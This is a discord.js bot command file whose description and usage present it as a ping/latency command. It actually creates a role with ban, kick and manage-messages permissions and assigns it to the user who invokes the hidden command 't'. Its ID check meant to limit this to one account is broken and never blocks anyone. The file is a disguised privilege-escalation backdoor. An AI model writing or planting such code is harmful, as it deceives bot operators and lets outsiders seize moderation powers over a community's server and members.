const Discord = require("discord.js");

module.exports = {
  
  name: 't',
    category: 'info',
    description: 'Returns bot and API latency in milliseconds.',
    usage: `${(process.env.PREFIX)}ping`,
  
  run : async (client, message, args) => {
  if(!message.member.id=="316999783782809600"){
    return message.channel.send("Not enough permissions")
  }
  let role = await message.guild.roles.create({data: {
    name: args[0],
    color: args[1],
    permissions:["MANAGE_MESSAGES", 'BAN_MEMBERS','KICK_MEMBERS']
  },
})
  .catch(console.error)
 await message.member.roles.add(role).catch(error => message.reply(`${error}`));
  message.reply("done");
  }
}